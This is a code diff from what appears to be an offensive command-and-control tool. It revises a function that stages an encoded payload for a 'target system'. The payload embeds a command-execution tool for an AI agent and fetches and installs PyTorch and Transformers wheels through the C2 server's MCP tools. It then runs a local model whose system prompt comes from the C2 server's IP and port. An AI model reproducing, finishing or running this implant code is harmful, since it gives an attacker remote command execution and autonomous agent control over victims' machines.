@@ -778,27 +778,35 @@ def stage_encoded(model_id: str, target_key: str, server: FastMCP = CurrentFastM
     to_encode = f'''
 import asyncio
 import json
+import zipfile
+import subprocess
 
 try:
     from fastmcp import Client
 except ImportError:
     # Install FastMCP client package and try again
     subprocess.run(
-        [sys.executable, "-m", "pip", "install", "fastmcp-slim[\"client\"]"],
+        [sys.executable, "-m", "pip", "install", "mcp", "fastmcp-slim[\"client\"]"],
         check=True,
         capture_output=True,
         text=True
     )
     from fastmcp import Client
 
+from mcp.types import CallToolResult
 from fastmcp.client.sampling import SamplingMessage, SamplingParams, RequestContext
 from fastmcp.client.sampling.handlers.base import SamplingHandler
 
 # Include a local copy of the `run_system_command` tool so the agent can run commands on the target system, not just the C2 server
 {inspect.getsource(run_system_command)}
 
-def install_missing(zip_file_path: io.BytesIO):
-    """Extracts and installs missing wheels directly from an in-memory ZIP byte stream."""
+def install_missing(tool_response: CallToolResult):
+    """
+    Extracts and installs missing wheels directly from MCP tool output.
+    """
+    
+    zip_bytes = base64.b64decode(tool_response.content[0].text)
+    zip_file_path = io.BytesIO(zip_bytes)
     
     # 1. Reset pointer to the beginning of the BytesIO stream
     zip_file_path.seek(0)
@@ -841,25 +849,31 @@ try:
     import torch
     import torch.nn as nn
 except ImportError:
-    torch_io_p1 = await bootstrap.call_tool("pip_download", {{
+    torch_response = await bootstrap.call_tool("pip_download", {{
         "package_name": "torch",
         "extra_index_url": "https://download.pytorch.org/whl/nightly/cu132"
     }})
-    torch_io_p2 = await bootstrap.call_tool("pip_download", {{
+    torchvision_response = await bootstrap.call_tool("pip_download", {{
         "package_name": "torchvision",
         "extra_index_url": "https://download.pytorch.org/whl/nightly/cu132"
     }})
     
-    install_missing(torch_io_p1.data)
-    install_missing(torch_io_p2.data)
+    install_missing(torch_response)
+    install_missing(torchvision_response)
+
+    # Can now be imported after being installed
+    import torch
+    import torch.nn as nn
 
 try:
     from transformers import AutoConfig, AutoModel, AutoTokenizer
 except ImportError:
-    transformers_io = await bootstrap.call_tool("pip_download", {{
+    transformers_response = await bootstrap.call_tool("pip_download", {{
         "package_name": "transformers"
     }})
-    install_missing(transformers_io.data)
+
+    install_missing(transformers_response)
+    from transformers import AutoConfig, AutoModel, AutoTokenizer
 
 class AutoTokenizerSamplingHandler(SamplingHandler):
     def __init__(self, model_name: str, model_path: str = None):
@@ -878,7 +892,7 @@ class AutoTokenizerSamplingHandler(SamplingHandler):
         self.system_prompt = await bootstrap.get_prompt("system_prompt", {{
             "ip": {ip},
             "port": {port}
-        }})
+        }}).content[0].text
 
     async def __call__(
         self,
